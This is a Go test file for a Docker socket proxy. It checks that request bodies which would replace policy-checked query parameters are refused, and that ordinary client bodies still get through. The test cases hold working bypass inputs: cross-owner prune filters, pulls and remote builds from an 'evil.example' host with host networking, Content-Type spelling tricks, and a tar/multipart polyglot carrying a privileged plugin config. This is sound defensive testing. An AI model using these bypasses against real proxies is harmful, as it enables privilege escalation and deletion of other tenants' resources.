package cmd

import (
	"archive/tar"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"mime/multipart"
	"net/http"
	"net/url"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/codeswhat/sockguard/app/internal/apipath"
	"github.com/codeswhat/sockguard/app/internal/config"
	"github.com/codeswhat/sockguard/app/internal/dockerfilters"
	"github.com/codeswhat/sockguard/app/internal/testhelp"
)

const (
	formBodyTestOwner    = "team-a"
	formBodyTestLabelKey = "com.sockguard.owner"
	formBodyTestOwnerSel = formBodyTestLabelKey + "=" + formBodyTestOwner
)

// daemonFormRead is one request as a Docker daemon would understand it: the
// parameters its handler ends up reading, which are not the ones in the URL
// when the request carries a form body.
type daemonFormRead struct {
	method      string
	path        string
	form        url.Values
	contentType string
	body        []byte
}

// dockerdShapedUpstream parses requests the way dockerd's API server does.
//
// Nearly every handler opens with httputils.ParseForm, a thin wrapper over
// (*http.Request).ParseForm, and then reads r.Form. net/http fills r.Form
// from an application/x-www-form-urlencoded body first and the URL query
// second, so r.Form.Get returns the body's value whenever both name a key.
//
// postBuild is the exception that matters. It never calls ParseForm; its
// first parameter read is r.FormValue, which calls ParseMultipartForm when
// r.Form is still nil. That parses a multipart/form-data body as well and
// appends its fields after the query's, so a multipart body supplies every
// parameter the query leaves out.
//
// Both behaviors were confirmed against dockerd 29.5.2.
func dockerdShapedUpstream(record func(daemonFormRead)) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		normPath := apipath.NormalizePath(r.URL.Path)
		contentType := r.Header.Get("Content-Type")
		if r.Method == http.MethodPost && normPath == "/build" {
			_ = r.FormValue("dockerfile")
		} else {
			_ = r.ParseForm()
		}
		body, _ := io.ReadAll(r.Body)
		record(daemonFormRead{
			method:      r.Method,
			path:        normPath,
			form:        r.Form,
			contentType: contentType,
			body:        body,
		})
		w.Header().Set("Content-Type", "application/json")
		if normPath == "/containers/create" {
			w.WriteHeader(http.StatusCreated)
			_, _ = io.WriteString(w, `{"Id":"abc","Warnings":[]}`)
			return
		}
		_, _ = io.WriteString(w, `{}`)
	})
}

// formBodyChain is the production handler chain (filter, ownership and proxy
// included) in front of a dockerd-shaped upstream, with an owner-scoped
// policy that allows prune, registry-restricted pulls and builds without
// remote contexts or host networking.
type formBodyChain struct {
	addr      string
	collector *testhelp.CollectingHandler

	mu    sync.Mutex
	reads []daemonFormRead
}

func (c *formBodyChain) daemonReads() []daemonFormRead {
	c.mu.Lock()
	defer c.mu.Unlock()
	return append([]daemonFormRead(nil), c.reads...)
}

func newFormBodyChain(t *testing.T, configure func(*config.Config)) *formBodyChain {
	t.Helper()

	chain := &formBodyChain{collector: &testhelp.CollectingHandler{}}
	socketPath := shortSocketPath(t, "form-body")
	startUnixHTTPUpstream(t, socketPath, dockerdShapedUpstream(func(read daemonFormRead) {
		chain.mu.Lock()
		chain.reads = append(chain.reads, read)
		chain.mu.Unlock()
	}))

	cfg := config.Defaults()
	cfg.Upstream.Socket = socketPath
	cfg.Health.Enabled = false
	cfg.Log.AccessLog = true
	cfg.Ownership.Owner = formBodyTestOwner
	cfg.Ownership.LabelKey = formBodyTestLabelKey
	cfg.RequestBody.ImagePull.AllowedRegistries = []string{"registry.internal"}
	// RUN is allowed so the build inspector has no reason to open the body;
	// remote contexts and host networking stay denied, which is what the
	// build cases below get around.
	cfg.RequestBody.Build.AllowRunInstructions = true
	cfg.Rules = []config.RuleConfig{
		{Match: config.MatchConfig{Method: http.MethodPost, Path: "/containers/prune"}, Action: "allow"},
		{Match: config.MatchConfig{Method: http.MethodPost, Path: "/images/prune"}, Action: "allow"},
		{Match: config.MatchConfig{Method: http.MethodPost, Path: "/networks/prune"}, Action: "allow"},
		{Match: config.MatchConfig{Method: http.MethodPost, Path: "/volumes/prune"}, Action: "allow"},
		{Match: config.MatchConfig{Method: http.MethodPost, Path: "/images/create"}, Action: "allow"},
		{Match: config.MatchConfig{Method: http.MethodPost, Path: "/build"}, Action: "allow"},
		{Match: config.MatchConfig{Method: http.MethodPost, Path: "/libpod/build"}, Action: "allow"},
		{Match: config.MatchConfig{Method: http.MethodPost, Path: "/containers/create"}, Action: "allow"},
		{Match: config.MatchConfig{Method: http.MethodPost, Path: "/plugins/create"}, Action: "allow"},
		{Match: config.MatchConfig{Method: "*", Path: "/**"}, Action: "deny"},
	}
	if configure != nil {
		configure(&cfg)
	}

	rules, err := compileRuleConfigsForTest(cfg.Rules)
	if err != nil {
		t.Fatalf("compile rules: %v", err)
	}
	logger := testhelp.NewTeeLogger(slog.NewTextHandler(io.Discard, nil), chain.collector)
	handler := buildServeHandler(t, &cfg, logger, nil, rules, newServeTestDeps())
	chain.addr, _ = startProxyChainServer(t, handler)
	return chain
}

// formBodyRequest is one request as a client puts it on the wire.
type formBodyRequest struct {
	method       string
	target       string
	contentTypes []string
	body         []byte
	// chunked sends the body with Transfer-Encoding: chunked, so the proxy
	// sees no Content-Length to judge it by.
	chunked bool
}

func (c *formBodyChain) do(t *testing.T, in formBodyRequest) (*http.Response, []byte) {
	t.Helper()

	var body io.Reader
	switch {
	case in.body == nil:
	case in.chunked:
		// An io.Reader net/http cannot size is sent chunked.
		body = io.MultiReader(bytes.NewReader(in.body))
	default:
		body = bytes.NewReader(in.body)
	}
	req, err := http.NewRequest(in.method, "http://"+c.addr+in.target, body)
	if err != nil {
		t.Fatalf("new request: %v", err)
	}
	for _, contentType := range in.contentTypes {
		req.Header.Add("Content-Type", contentType)
	}

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("%s %s: %v", in.method, in.target, err)
	}
	defer resp.Body.Close()
	payload, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read response: %v", err)
	}
	return resp, payload
}

func mustFiltersQuery(t *testing.T, filters map[string][]string) string {
	t.Helper()
	encoded, err := json.Marshal(filters)
	if err != nil {
		t.Fatalf("marshal filters: %v", err)
	}
	return string(encoded)
}

func mustMultipartFields(t *testing.T, fields map[string]string) ([]byte, string) {
	t.Helper()
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	keys := make([]string, 0, len(fields))
	for key := range fields {
		keys = append(keys, key)
	}
	slices.Sort(keys)
	for _, key := range keys {
		if err := writer.WriteField(key, fields[key]); err != nil {
			t.Fatalf("write multipart field %q: %v", key, err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("close multipart writer: %v", err)
	}
	return body.Bytes(), writer.FormDataContentType()
}

// pruneEscapedOwnerScope reports how a prune the daemon is about to run got
// out from under the owner filter, or "" when the filter is in force.
func pruneEscapedOwnerScope(read daemonFormRead) string {
	form := read.form
	filters, err := dockerfilters.Decode(form.Get("filters"))
	if err != nil {
		return fmt.Sprintf("the daemon read an undecodable filters value %q", form.Get("filters"))
	}
	if slices.Contains(filters["label"], formBodyTestOwnerSel) {
		return ""
	}
	return fmt.Sprintf("the daemon prunes with filters=%s, which is not scoped to %s", form.Get("filters"), formBodyTestOwnerSel)
}

// TestFormBodyCannotReplaceTheQueryPolicyEvaluated is the end-to-end proof for
// the form-body split. Every case sends a request whose URL query satisfies
// policy and whose body carries different parameters, through the full
// production chain, to an upstream that parses the way dockerd does.
//
// Before the form-body guard each of these reached the upstream, and the
// upstream acted on the body's parameters: sockguard had injected the owner
// filter into a query string the daemon no longer consulted, and had checked
// a registry and a build context the daemon was not going to use.
func TestFormBodyCannotReplaceTheQueryPolicyEvaluated(t *testing.T) {
	const formType = "application/x-www-form-urlencoded"

	foreignPrune := url.Values{"filters": {`{"label":["com.sockguard.owner=team-b"]}`}}.Encode()
	clientPruneQuery := "?filters=" + url.QueryEscape(mustFiltersQuery(t, map[string][]string{"label": {"stage=ci"}}))

	multipartBuild, multipartBuildType := mustMultipartFields(t, map[string]string{
		"remote":      "https://evil.example/context.tar",
		"networkmode": "host",
	})

	// A tar carrying a privileged plugin config, then a multipart part
	// carrying a harmless one.
	privilegedPlugin := mustTarWithFile(t, "config.json", `{"Linux":{"Capabilities":["CAP_SYS_ADMIN"]}}`)
	var pluginPolyglot []byte
	pluginPolyglot = append(pluginPolyglot, privilegedPlugin...)
	pluginPolyglot = append(pluginPolyglot, "\r\n--sockguard\r\nContent-Disposition: form-data; name=\"context\"; filename=\"plugin.tar\"\r\n\r\n"...)
	pluginPolyglot = append(pluginPolyglot, mustTarWithFile(t, "config.json", `{"Linux":{"Capabilities":[]}}`)...)
	pluginPolyglot = append(pluginPolyglot, "\r\n--sockguard--\r\n"...)

	tests := []struct {
		name    string
		request formBodyRequest
		// escaped reports, from what the daemon read, how the request got
		// past policy. It only runs if the daemon was reached.
		escaped func(daemonFormRead) string
	}{
		{
			name: "container prune reads the body's filters",
			request: formBodyRequest{
				method: http.MethodPost, target: "/v1.54/containers/prune" + clientPruneQuery,
				contentTypes: []string{formType}, body: []byte(foreignPrune),
			},
			escaped: pruneEscapedOwnerScope,
		},
		{
			name: "image prune reads the body's filters",
			request: formBodyRequest{
				method: http.MethodPost, target: "/v1.54/images/prune" + clientPruneQuery,
				contentTypes: []string{formType}, body: []byte(foreignPrune),
			},
			escaped: pruneEscapedOwnerScope,
		},
		{
			name: "network prune reads the body's filters",
			request: formBodyRequest{
				method: http.MethodPost, target: "/v1.54/networks/prune" + clientPruneQuery,
				contentTypes: []string{formType}, body: []byte(foreignPrune),
			},
			escaped: pruneEscapedOwnerScope,
		},
		{
			name: "volume prune reads the body's filters",
			request: formBodyRequest{
				method: http.MethodPost, target: "/v1.54/volumes/prune" + clientPruneQuery,
				contentTypes: []string{formType}, body: []byte(foreignPrune),
			},
			escaped: pruneEscapedOwnerScope,
		},
		{
			name: "prune with no query and an empty filter in the body",
			request: formBodyRequest{
				method: http.MethodPost, target: "/containers/prune",
				contentTypes: []string{formType}, body: []byte("filters=%7B%7D"),
			},
			escaped: pruneEscapedOwnerScope,
		},
		{
			name: "prune with a chunked body",
			request: formBodyRequest{
				method: http.MethodPost, target: "/containers/prune" + clientPruneQuery,
				contentTypes: []string{formType}, body: []byte(foreignPrune), chunked: true,
			},
			escaped: pruneEscapedOwnerScope,
		},
		{
			name: "prune with an upper-case media type and a parameter",
			request: formBodyRequest{
				method: http.MethodPost, target: "/containers/prune" + clientPruneQuery,
				contentTypes: []string{"Application/X-WWW-Form-URLEncoded; charset=UTF-8"}, body: []byte(foreignPrune),
			},
			escaped: pruneEscapedOwnerScope,
		},
		{
			// mime.ParseMediaType reports the malformed parameter and still
			// returns the media type, and moby's ParseForm wrapper swallows
			// every "mime:" error.
			name: "prune with a malformed media type parameter",
			request: formBodyRequest{
				method: http.MethodPost, target: "/containers/prune" + clientPruneQuery,
				contentTypes: []string{formType + "; =bad"}, body: []byte(foreignPrune),
			},
			escaped: pruneEscapedOwnerScope,
		},
		{
			// mime.ParseMediaType lower-cases with strings.ToLower, which
			// maps U+0130 to an ASCII "i".
			name: "prune with a non-ASCII spelling net/http folds to the form type",
			request: formBodyRequest{
				method: http.MethodPost, target: "/containers/prune" + clientPruneQuery,
				contentTypes: []string{"applİcation/x-www-form-urlencoded"}, body: []byte(foreignPrune),
			},
			escaped: pruneEscapedOwnerScope,
		},
		{
			// net/http reads the first Content-Type line and ignores the rest.
			name: "prune with a second Content-Type line that looks harmless",
			request: formBodyRequest{
				method: http.MethodPost, target: "/containers/prune" + clientPruneQuery,
				contentTypes: []string{formType, "application/json"}, body: []byte(foreignPrune),
			},
			escaped: pruneEscapedOwnerScope,
		},
		{
			name: "image pull reads the body's fromImage",
			request: formBodyRequest{
				method: http.MethodPost, target: "/v1.54/images/create?fromImage=registry.internal%2Fapp&tag=1",
				contentTypes: []string{formType}, body: []byte("fromImage=evil.example%2Fmalware&tag=latest"),
			},
			escaped: func(read daemonFormRead) string {
				if got := read.form.Get("fromImage"); got != "registry.internal/app" {
					return fmt.Sprintf("the daemon pulls fromImage=%q, outside request_body.image_pull.allowed_registries", got)
				}
				return ""
			},
		},
		{
			name: "build reads remote, networkmode and labels from a form-encoded body",
			request: formBodyRequest{
				method: http.MethodPost, target: "/v1.54/build?t=app%3Adev",
				contentTypes: []string{formType},
				body:         []byte("remote=https%3A%2F%2Fevil.example%2Fcontext.tar&networkmode=host&labels=%7B%7D"),
			},
			escaped: func(read daemonFormRead) string {
				return buildEscapedPolicy(read.form, true)
			},
		},
		{
			// dockerd's createPlugin ignores Content-Type and untars the raw
			// body, stopping at the tar end marker. The plugin inspector read
			// a multipart body's parts instead, and a multipart reader skips
			// everything ahead of the first boundary, so the tar the daemon
			// unpacks could sit there uninspected.
			name: "plugin create untars a multipart preamble the inspector skipped",
			request: formBodyRequest{
				method: http.MethodPost, target: "/v1.54/plugins/create?name=acme%2Fplugin",
				contentTypes: []string{"multipart/form-data; boundary=sockguard"}, body: pluginPolyglot,
			},
			escaped: func(read daemonFormRead) string {
				return "the daemon untars a plugin config.json reading " + firstTarEntry(read.body, "config.json")
			},
		},
		{
			name: "build reads remote and networkmode from a multipart body",
			request: formBodyRequest{
				method: http.MethodPost, target: "/v1.54/build?t=app%3Adev",
				contentTypes: []string{multipartBuildType}, body: multipartBuild,
			},
			escaped: func(read daemonFormRead) string {
				return buildEscapedPolicy(read.form, false)
			},
		},
	}

	chain := newFormBodyChain(t, nil)

	// Control for the plugin case: sent as the plain tar it is, the
	// privileged plugin is denied by the plugin inspector, so the multipart
	// wrapping below is what would have carried it past.
	t.Run("control: the privileged plugin tar is denied on its own", func(t *testing.T) {
		readsBefore := len(chain.daemonReads())
		resp, payload := chain.do(t, formBodyRequest{
			method: http.MethodPost, target: "/v1.54/plugins/create?name=acme%2Fplugin",
			contentTypes: []string{"application/x-tar"}, body: privilegedPlugin,
		})
		if resp.StatusCode != http.StatusForbidden {
			t.Fatalf("status = %d, want %d; body: %s", resp.StatusCode, http.StatusForbidden, payload)
		}
		if reads := chain.daemonReads()[readsBefore:]; len(reads) != 0 {
			t.Fatalf("the daemon was reached: %#v", reads)
		}
	})

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			readsBefore := len(chain.daemonReads())
			denialsBefore := len(chain.collector.FindMessage("request_denied"))

			resp, payload := chain.do(t, tt.request)

			for _, read := range chain.daemonReads()[readsBefore:] {
				t.Errorf("the daemon was reached with %s %s (Content-Type %q): %s",
					read.method, read.path, read.contentType, tt.escaped(read))
			}
			if resp.StatusCode != http.StatusBadRequest {
				t.Fatalf("status = %d, want %d; body: %s", resp.StatusCode, http.StatusBadRequest, payload)
			}
			var decoded map[string]string
			if err := json.Unmarshal(payload, &decoded); err != nil {
				t.Fatalf("json.Unmarshal(%q): %v", payload, err)
			}
			if !strings.Contains(decoded["message"], "request bodies are not accepted") {
				t.Fatalf("message = %q, want the form-body refusal", decoded["message"])
			}

			denials := chain.collector.FindMessage("request_denied")
			if len(denials) != denialsBefore+1 {
				t.Fatalf("got %d request_denied records, want %d", len(denials), denialsBefore+1)
			}
			last := denials[len(denials)-1]
			if got := last.Attrs["reason_code"]; got != reasonCodeRequestFormBodyRefused {
				t.Fatalf("reason_code = %#v, want %q", got, reasonCodeRequestFormBodyRefused)
			}
			if got := last.Attrs["decision"]; got != "deny" {
				t.Fatalf("decision = %#v, want %q", got, "deny")
			}
		})
	}
}

// buildEscapedPolicy reports which build controls the daemon read that policy
// never allowed. wantUnowned is set for the form-encoded case, where the
// body's labels also displace the owner label sockguard wrote into the query.
func buildEscapedPolicy(form url.Values, wantUnowned bool) string {
	var escaped []string
	if remote := form.Get("remote"); remote != "" {
		escaped = append(escaped, fmt.Sprintf("builds from remote context %q with allow_remote_context off", remote))
	}
	if mode := form.Get("networkmode"); mode != "" {
		escaped = append(escaped, fmt.Sprintf("builds with networkmode=%q with allow_host_network off", mode))
	}
	if wantUnowned && !strings.Contains(form.Get("labels"), formBodyTestOwner) {
		escaped = append(escaped, fmt.Sprintf("labels the image %q, without the owner label", form.Get("labels")))
	}
	if len(escaped) == 0 {
		return ""
	}
	return "the daemon " + strings.Join(escaped, "; ")
}

func mustTarWithFile(t *testing.T, name, content string) []byte {
	t.Helper()
	var buf bytes.Buffer
	writer := tar.NewWriter(&buf)
	if err := writer.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(content))}); err != nil {
		t.Fatalf("write tar header: %v", err)
	}
	if _, err := io.WriteString(writer, content); err != nil {
		t.Fatalf("write tar body: %v", err)
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("close tar: %v", err)
	}
	return buf.Bytes()
}

// firstTarEntry reads raw as a tar the way a daemon unpacking the request
// body would, and returns the content of the first entry called name.
func firstTarEntry(raw []byte, name string) string {
	reader := tar.NewReader(bytes.NewReader(raw))
	for {
		header, err := reader.Next()
		if err != nil {
			return "nothing: " + err.Error()
		}
		if header.Name != name {
			continue
		}
		content, _ := io.ReadAll(reader)
		return string(content)
	}
}

// TestBodiesRealClientsSendStillReachTheDaemon is the negative control for the
// form-body guard, through the same chain: the body shapes Docker and Podman
// clients actually send are forwarded byte for byte, and a form media type
// with nothing behind it is not a form body.
func TestBodiesRealClientsSendStillReachTheDaemon(t *testing.T) {
	buildContext := mustTarWithFile(t, "Dockerfile", "FROM scratch\n")
	podmanBuild, podmanBuildType := mustMultipartFields(t, map[string]string{"MainContext": string(buildContext)})

	tests := []struct {
		name       string
		request    formBodyRequest
		wantStatus int
		wantPath   string
		// wantBody is compared with what the daemon received when non-nil.
		wantBody []byte
		check    func(*testing.T, daemonFormRead)
	}{
		{
			name:       "JSON body (docker run)",
			wantStatus: http.StatusCreated,
			wantPath:   "/containers/create",
			request: formBodyRequest{
				method: http.MethodPost, target: "/v1.54/containers/create?name=web",
				contentTypes: []string{"application/json"}, body: []byte(`{"Image":"registry.internal/app:1"}`),
			},
			check: func(t *testing.T, read daemonFormRead) {
				if !bytes.Contains(read.body, []byte(formBodyTestOwner)) {
					t.Fatalf("forwarded create body = %s, want the owner label stamped in", read.body)
				}
				if got := read.form.Get("name"); got != "web" {
					t.Fatalf("daemon read name=%q, want %q", got, "web")
				}
			},
		},
		{
			name:       "tar body (docker build)",
			wantStatus: http.StatusOK,
			wantPath:   "/build",
			wantBody:   buildContext,
			request: formBodyRequest{
				method: http.MethodPost, target: "/v1.54/build?t=app%3Adev",
				contentTypes: []string{"application/x-tar"}, body: buildContext,
			},
		},
		{
			name:       "chunked tar body",
			wantStatus: http.StatusOK,
			wantPath:   "/build",
			wantBody:   buildContext,
			request: formBodyRequest{
				method: http.MethodPost, target: "/build?t=app%3Adev",
				contentTypes: []string{"application/x-tar"}, body: buildContext, chunked: true,
			},
		},
		{
			name:       "text/plain body (the Docker SDK default for a raw stream)",
			wantStatus: http.StatusOK,
			wantPath:   "/containers/prune",
			request: formBodyRequest{
				method: http.MethodPost, target: "/containers/prune",
				contentTypes: []string{"text/plain"}, body: []byte("filters=%7B%7D"),
			},
			check: func(t *testing.T, read daemonFormRead) {
				if escaped := pruneEscapedOwnerScope(read); escaped != "" {
					t.Fatal(escaped)
				}
			},
		},
		{
			name:       "body with no Content-Type",
			wantStatus: http.StatusOK,
			wantPath:   "/containers/prune",
			request: formBodyRequest{
				method: http.MethodPost, target: "/containers/prune",
				body: []byte("filters=%7B%7D"),
			},
			check: func(t *testing.T, read daemonFormRead) {
				if escaped := pruneEscapedOwnerScope(read); escaped != "" {
					t.Fatal(escaped)
				}
			},
		},
		{
			name:       "no body and no Content-Type (docker system prune)",
			wantStatus: http.StatusOK,
			wantPath:   "/containers/prune",
			request:    formBodyRequest{method: http.MethodPost, target: "/v1.54/containers/prune"},
			check: func(t *testing.T, read daemonFormRead) {
				if escaped := pruneEscapedOwnerScope(read); escaped != "" {
					t.Fatal(escaped)
				}
			},
		},
		{
			// curl -d '' and wget --post-data='' label an empty POST this
			// way. With no body there is nothing for the daemon to read
			// parameters from.
			name:       "form media type on an empty body (curl -d '')",
			wantStatus: http.StatusOK,
			wantPath:   "/containers/prune",
			request: formBodyRequest{
				method: http.MethodPost, target: "/containers/prune",
				contentTypes: []string{"application/x-www-form-urlencoded"}, body: []byte{},
			},
			check: func(t *testing.T, read daemonFormRead) {
				if escaped := pruneEscapedOwnerScope(read); escaped != "" {
					t.Fatal(escaped)
				}
			},
		},
		{
			// podman-remote build with additional contexts. The filter's
			// own blind-write acknowledgment still governs it.
			name:       "multipart body on Podman's native build",
			wantStatus: http.StatusOK,
			wantPath:   "/libpod/build",
			wantBody:   podmanBuild,
			request: formBodyRequest{
				method: http.MethodPost, target: "/v5.8.0/libpod/build?t=app%3Adev",
				contentTypes: []string{podmanBuildType}, body: podmanBuild,
			},
		},
	}

	chain := newFormBodyChain(t, func(cfg *config.Config) {
		cfg.InsecureAllowBodyBlindWrites = true
	})
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			readsBefore := len(chain.daemonReads())

			resp, payload := chain.do(t, tt.request)
			if resp.StatusCode != tt.wantStatus {
				t.Fatalf("status = %d, want %d; body: %s", resp.StatusCode, tt.wantStatus, payload)
			}

			// Ownership's own inspect lookups are GETs to other paths; only
			// the forwarded client request is under test.
			var reads []daemonFormRead
			for _, read := range chain.daemonReads()[readsBefore:] {
				if read.method == tt.request.method && read.path == tt.wantPath {
					reads = append(reads, read)
				}
			}
			if len(reads) != 1 {
				t.Fatalf("daemon saw %d requests, want 1: %#v", len(reads), reads)
			}
			if reads[0].path != tt.wantPath {
				t.Fatalf("daemon saw path %q, want %q", reads[0].path, tt.wantPath)
			}
			if tt.wantBody != nil && !bytes.Equal(reads[0].body, tt.wantBody) {
				t.Fatalf("daemon received %d body bytes, want the %d sent, unchanged", len(reads[0].body), len(tt.wantBody))
			}
			if tt.check != nil {
				tt.check(t, reads[0])
			}
		})
	}
}
